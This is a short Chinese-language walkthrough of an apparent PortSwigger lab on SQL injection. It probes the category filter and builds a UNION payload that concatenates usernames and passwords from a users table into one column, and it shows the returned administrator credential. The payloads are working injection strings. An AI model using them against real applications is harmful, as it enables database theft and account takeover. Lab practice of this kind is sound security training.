# 实验：SQL 注入 UNION 攻击，在单列中检索多个值

本实验在产品类别过滤器中包含一个 SQL 注入漏洞。查询结果会返回在应用程序的响应中，因此你可以使用 UNION 攻击从其他表中检索数据。

数据库包含一个名为 `users` 的不同表，其中包含名为 `username` 和 `password` 的列。

为了解决本实验，请执行一个 SQL 注入 UNION 攻击以检索所有用户名和密码，并使用这些信息以 `administrator` 用户身份登录。

> **提示**
> 你可以在我们的 [SQL 注入速查表](https://portswigger.net/web-security/sql-injection/cheat-sheet) 中找到一些有用的 Payload。

## 步骤

探测
- 使用检索的过滤功能
    ```http
    GET /filter?category=Gifts HTTP/2
    ```
- 使用1/2个单引号进行经典的字符串型 SQLi 注入点测试
    - 存在典型行为

- 探测列数
    - 2列

- 探测列的类型
    ```sql
    $input = 'Gifts' UNION SELECT NULL,'a' -- 
    ```
    - 列2为字符串型

- 版本探测 `version()` 
    - 目标数据库为 PostgreSQL


构建最终载荷
- 在列2，使用字符串连接
    ```sql
    $input = 'Gifts' AND 1=0 UNION SELECT NULL,username || ' : ' || password FROM users --
    ```
    - 服务器响应
        ```log
        administrator : an45l4nlk7mzrso32x1h
        ```
